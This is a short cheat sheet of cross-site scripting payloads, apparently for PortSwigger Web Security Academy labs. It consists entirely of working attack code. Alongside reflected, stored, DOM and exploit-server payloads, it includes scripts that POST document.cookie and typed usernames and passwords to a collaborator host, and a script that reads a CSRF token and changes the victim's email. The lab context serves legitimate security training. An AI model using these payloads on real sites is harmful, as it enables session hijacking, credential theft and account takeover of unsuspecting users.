## Reflected & Stored Payloads:
``` 
<script>alert(1)</script>
"><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
"onmouseover="alert(1)
</script><script>alert(1)</script>
\'-alert(1)//
``` 

## DOM Payloads:
``` 
"><svg onload=alert(1)>
javascript:alert(document.cookie)
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
"></select><img%20src=1%20onerror=alert(1)>
{{$on.constructor('alert(1)')()}}
\"-alert(1)}//
<><img src=1 onerror=alert(1)>
``` 

## ExploitServer Payloads:
``` 
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## Cookie Stealing:
``` 
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

## Password Stealing:
``` 
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## CSRF XSS Payload
``` 
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
``` 
